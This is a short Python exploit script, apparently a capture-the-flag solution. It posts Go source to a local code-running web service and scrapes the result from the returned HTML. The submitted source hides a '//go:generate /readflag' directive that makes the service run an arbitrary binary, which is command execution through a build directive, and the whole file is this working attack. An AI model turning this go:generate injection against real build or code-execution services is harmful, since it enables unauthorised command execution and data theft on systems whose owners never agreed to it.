#!/usr/bin/env python3
import re
import requests

HOST = "http://localhost:8000"

s = requests.Session()


def run(code):
    r = s.post(HOST, data={"code": code})
    return re.findall(r"<pre[^>]*>(.*?)</pre>", r.text, re.S)[0]


print(run("""\
package main

//go:generate /readflag

func main() {}
"""))
